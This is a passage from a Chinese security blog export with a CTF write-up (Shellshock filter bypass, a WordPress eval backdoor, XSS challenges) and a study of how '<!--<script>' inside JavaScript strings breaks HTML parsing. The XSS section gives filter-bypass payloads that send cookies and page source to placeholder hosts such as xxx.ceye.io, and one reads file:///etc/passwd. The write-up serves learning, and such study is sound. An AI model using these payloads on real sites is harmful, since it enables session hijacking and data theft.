<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_default</span><span class="params">()</span> </span>&#123; <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;Welcome to <span class="keyword">use</span> <span class="title">our</span> <span class="title">developer</span> <span class="title">assistant</span> <span class="title">service</span>. <span class="title">We</span> <span class="title">provide</span> <span class="title">servial</span> <span class="title">useless</span> <span class="title">features</span> <span class="title">to</span> <span class="title">make</span> <span class="title">your</span> <span class="title">developing</span> <span class="title">life</span> <span class="title">harder</span>.&lt;/<span class="title">p</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="title">img</span> <span class="title">src</span>="<span class="title">windows</span>-<span class="title">run</span>.<span class="title">jpg</span>" <span class="title">alt</span>="<span class="title">command</span> <span class="title">executor</span>"&gt;</span><br><span class="line">&lt;?<span class="title">php</span> &#125;</span><br><span class="line">?&gt;&lt;!<span class="title">DOCTYPE</span> <span class="title">html</span>&gt;</span><br><span class="line">&lt;<span class="title">html</span> <span class="title">lang</span>="<span class="title">en</span>"&gt;</span><br><span class="line">  &lt;<span class="title">head</span>&gt;</span><br><span class="line">    &lt;<span class="title">meta</span> <span class="title">charset</span>="<span class="title">UTF</span>-8"&gt;</span><br><span class="line">    &lt;<span class="title">title</span>&gt;<span class="title">Command</span> <span class="title">Executor</span>&lt;/<span class="title">title</span>&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">bootstrap</span>/<span class="title">css</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">link</span> <span class="title">rel</span>="<span class="title">stylesheet</span>" <span class="title">href</span>="<span class="title">comic</span>-<span class="title">neue</span>/<span class="title">font</span>.<span class="title">css</span>" <span class="title">media</span>="<span class="title">all</span>"&gt;</span><br><span class="line">    &lt;<span class="title">style</span>&gt;</span><br><span class="line">      <span class="title">nav</span> &#123; <span class="title">margin</span>-<span class="title">bottom</span>: 1<span class="title">rem</span>; &#125;</span><br><span class="line">      img &#123; max-width: <span class="number">100</span>%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="index.php"&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class="navbar-nav"&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($pages <span class="keyword">as</span> <span class="keyword">list</span>($file, $title)): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;li class="nav-item"&gt;</span><br><span class="line">          &lt;a class="nav-link" href="index.php?func=&lt;?=$file?&gt;"&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>; <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;&lt;?php if(is_callable('render')) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>首先大概看一下index.php的逻辑</p>
<p>这个black_list其实已经很明显的在提示这是一个bash破壳漏洞了…</p>
<p>上Freebuf学一波，讲的很清楚</p>
<p><a href="https://www.freebuf.com/articles/system/50065.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/50065.html</a></p>
<p>如果在全局变量中发现/flag关键字，或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\(\)\s*\&#123;\s*:;\s*\&#125;;</span><br></pre></td></tr></table></figure>

<p>满足这个形式的正则，就被detected</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bash破壳漏洞利用</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtDSO.png" alt="KUtDSO.png"></p>
<p>题目中的putenv就充当了这里export的作用，我们可以把user-agent会换成我们的payload</p>
<p>同时bash -c env，最终反弹shell(还有中间加个空格就可以bypass正则了)</p>
<p><img src="https://s2.ax1x.com/2019/10/24/KUtjhV.png" alt="KUtjhV.png"></p>
<p>最终拿flag的payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag-reader flag &gt; &#x2F;var&#x2F;tmp&#x2F;test &lt; &#x2F;var&#x2F;tmp&#x2F;test</span><br></pre></td></tr></table></figure>

<h3 id="Wordpress1"><a href="#Wordpress1" class="headerlink" title="Wordpress1"></a>Wordpress1</h3><p><strong>plugins/core.php中发现问题代码，是个打印flag的函数</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line">	<span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先看一下这个$h…硬拼出来的md5可还行，解密一下这个md5发现是cat flag，最后eval解密后md5的值，也就是说传入一个cat flag就可以，再加上伪造一个ip。</p>
<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>这三道连一起真的挺好…但是xssbot挂了吧？….</p>
<p>记录一下有意思的Payload吧</p>
<p>第一关的xss可以通过svg绕过，或者img绕过，当然其他也有很多标签可以绕过</p>
<p><strong>img绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&quot;onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>本来这里是过滤掉了onerror不过可以通过去掉前面的空格bypass，至于括号的过滤，直接html编码就可以了</p>
<p>这里的html编码对应的alert(1)，如果我们想打cookie,可以用如下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>或者说</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://ip:port/"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.body.innerHTML);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>svg绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip:port&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xss打源码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;xx.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var img &#x3D; document.createElement(&quot;img&quot;);</span><br><span class="line">img.src&#x3D;&quot;http:&#x2F;&#x2F;ip:port&#x2F;&quot;+escape(document.body.innerHTML);</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure>

<p><strong>通过ajax打出回显内容</strong></p>
<p><strong>GET型</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xxx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>GET<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.send();</span></span><br><span class="line"><span class="string">"</span>&gt;</span><br></pre></td></tr></table></figure>

<p><strong>POST型</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xmlhttp=new XMLHttpRequest();</span></span><br><span class="line"><span class="string">xmlhttp.onreadystatechange=function()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">document.location='http://xx/?'+btoa(xmlhttp.responseText);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">xmlhttp.open("</span>POST<span class="string">","</span>request.php<span class="string">",true);</span></span><br><span class="line"><span class="string">xmlhttp.setRequestHeader("</span>Content-type<span class="string">","</span>application/x-www-form-urlencoded<span class="string">");</span></span><br><span class="line"><span class="string">xmlhttp.send("</span>url=file:<span class="comment">///etc/passwd");</span></span><br><span class="line"><span class="string">"&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript中变量声明带来的Tags Broken</title>
    <url>/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/</url>
    <content><![CDATA[<h3 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h3><p><img src="https://s1.ax1x.com/2020/04/08/GW8xXt.png" alt="GW8xXt.png"></p>
<p>上文给出的例子如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>看一下会造成的影响</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWGI3j.png" alt="GWGI3j.png"></p>
<p>很明显可见的是img标签以及下面的html全部被吃掉了</p>
<h3 id="原因探讨以及不同场景下的fuzz"><a href="#原因探讨以及不同场景下的fuzz" class="headerlink" title="原因探讨以及不同场景下的fuzz"></a>原因探讨以及不同场景下的fuzz</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>官方文档给出的解释如下：</p>
<blockquote>
<p>由于遗留原因，HTML元素中的“ <code>&lt;!--</code>”和“ <code>&lt;script</code>”字符串<code>script</code>需要进行平衡，以便解析器考虑关闭该块</p>
</blockquote>
<p>也就是说在<code>&lt;!--</code>的作用下<code>&lt;script&gt;</code>是要去和下面的<code>&lt;/script&gt;</code>闭合的，而<code>&lt;!--</code>的作用仍然是充当注释符作用，虽然<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>进行了闭合，但是因为注释符的原因，里面的内容并不会被解析</p>
<h4 id="注释状态下的其他语句解析"><a href="#注释状态下的其他语句解析" class="headerlink" title="注释状态下的其他语句解析"></a>注释状态下的其他语句解析</h4><p>通过测试发现这种注释语句还会带来标签内语句无法解析的效果</p>
<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=alert(<span class="number">1</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!-- &lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>虽然最后alert(1)也在script标签内 ，但是无法执行</p>
<p><img src="https://s1.ax1x.com/2020/04/09/G4XMqK.png" alt="G4XMqK.png"></p>
<h4 id="不同场景下的fuzz"><a href="#不同场景下的fuzz" class="headerlink" title="不同场景下的fuzz"></a>不同场景下的fuzz</h4><h5 id="标签的fuzz"><a href="#标签的fuzz" class="headerlink" title="标签的fuzz"></a>标签的fuzz</h5><p>这里主要是不同标签能否产生类似script这样的闭合进行的fuzz，结果发现，似乎只有具备script这样特性的标签才可以产生这样的效果。</p>
<p>并且必须要&lt;!–与<code>&lt;script&gt;</code>进行结合搭配才可以产生这样的效果，在只有&lt;!–和<code>&lt;script&gt;</code>的情况下都无法产生预期的结果</p>
<p>这里对为什么必须要二者结合在一起才能产生这样的效果进行了一个猜想：</p>
<p>在如下代码情况下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;!--</code>并未起到注释的效果可能是因为被变量的字符串作用域所限制，使得他只能是一个普通的字符串，而在如下的代码情况下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: &lt;!--&lt;script&gt;'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(example);</span></span><br><span class="line"><span class="actionscript">       <span class="comment">// alert(1);</span></span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>的闭合导致后面的单引号失去了原本的作用，而&lt;!–也发挥了他本身的作用，所以最终导致的后果就是，红框里的内容全部当作了注释</p>
<p><img src="https://s1.ax1x.com/2020/04/08/GWWXCQ.png" alt="GWWXCQ.png"></p>
<p>需要注意的是：在这种情况下<code>&lt;script&gt;</code>里面的代码是完全无效的</p>
<p>探讨：</p>
<p>在测试完标签后发现了同样比较有趣的一点是如果我们直接在变量中声明<code>&lt;/script&gt;</code>，测试代码与效果如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> example = <span class="string">'Consider this string: </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line">        console.log(example);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/04/08/GW4KhD.png" alt="GW4KhD.png"></p>
<p>可以发现如果在变量中直接声明<code>&lt;/script&gt;</code>的话会直接和前面的<code>&lt;script&gt;</code>进了闭合，把单引号以及之后的内容都扔到了后面，产生了直接使后面代码无效化的影响</p>
<h4 id="字符串场景下的利用"><a href="#字符串场景下的利用" class="headerlink" title="字符串场景下的利用"></a>字符串场景下的利用</h4><p>漏洞利用场景如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload='<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>';</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.google.com"</span>;</span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对于这个页面的效果是在1000ms后自动跳转到谷歌，不过我们可以变量的设置来bypass这个跳转</p>
<p>实现如下：<br><img src="https://s1.ax1x.com/2020/04/08/Gf3bcR.png" alt="Gf3bcR.png"></p>
<h4 id="非字符串场景下的利用"><a href="#非字符串场景下的利用" class="headerlink" title="非字符串场景下的利用"></a>非字符串场景下的利用</h4><h5 id="非字符串下变量声明中-lt-–产生的问题"><a href="#非字符串下变量声明中-lt-–产生的问题" class="headerlink" title="非字符串下变量声明中&lt;!–产生的问题"></a>非字符串下变量声明中&lt;!–产生的问题</h5><p>如果对一个变量直接用如下方式赋值（在控制台）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a&#x3D;&lt;!--</span><br></pre></td></tr></table></figure>

<p>将一直处于输入状态</p>
<p>对于这个情况，可以前面一些字符或者数字进行避免</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var a&#x3D;1&lt;!--</span><br></pre></td></tr></table></figure>

<p>最终a的值为1</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> a=<span class="number">1</span>&lt;!--;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> b=<span class="number">2</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上js可正常执行</p>
<h5 id="应用场景探讨"><a href="#应用场景探讨" class="headerlink" title="应用场景探讨"></a>应用场景探讨</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="handlebars"><span class="xml">    var payload=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="actionscript">        location=<span class="string">"http://www.baidu.com"</span></span></span><br><span class="line">        </span><br><span class="line">    &#125;, 1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用方式其实差不多</p>
<ul>
<li>在没有分号的情况的下可以用：<code>xss=&lt;!--&lt;script或者&lt;!--&lt;script&gt;</code></li>
<li>在有分号限制的情况下只有：<code>xss=&lt;!--&lt;script&gt;</code></li>
</ul>
<h5 id="进一步探讨"><a href="#进一步探讨" class="headerlink" title="进一步探讨"></a>进一步探讨</h5><p>在另一种结构下: 如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> location = <span class="string">'http://127.0.0.1'</span>;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        test=<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line"><span class="actionscript">    &#125;<span class="keyword">catch</span>(err)&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        return location = '/?a='+<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]; <span class="meta">?&gt;</span></span>;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,1000);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">//normal part</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要做的是不影响下面的正常js语句且能做到xss</p>
<p>而且特别需要注意的是在try中的代码时return location而非location，区别是</p>
<ul>
<li><p>return条件下：return完了之后的语句并不会执行</p>
</li>
